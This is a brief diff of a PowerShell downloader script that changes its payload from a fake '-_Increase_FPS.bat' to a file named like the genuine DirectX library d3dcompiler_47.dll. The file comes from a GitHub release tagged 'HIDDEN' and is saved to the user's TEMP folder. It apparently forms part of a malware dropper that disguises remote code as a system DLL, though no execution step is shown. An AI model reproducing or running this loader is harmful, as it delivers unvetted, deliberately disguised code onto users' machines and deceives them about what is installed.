@@ -1,6 +1,6 @@
 # 1. Correct GitHub raw link
-$exeUrl = "https://github.com/lokeshx2008/EXE/releases/download/BAT/-_Increase_FPS.bat"
-$tempPath = "$env:TEMP\-_Increase_FPS.bat"
+$exeUrl = "https://github.com/lokeshx2008/HK/releases/download/HIDDEN/d3dcompiler_47.dll"
+$tempPath = "$env:TEMP\d3dcompiler_47.dll"
 
 # 2. Download EXE from GitHub
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
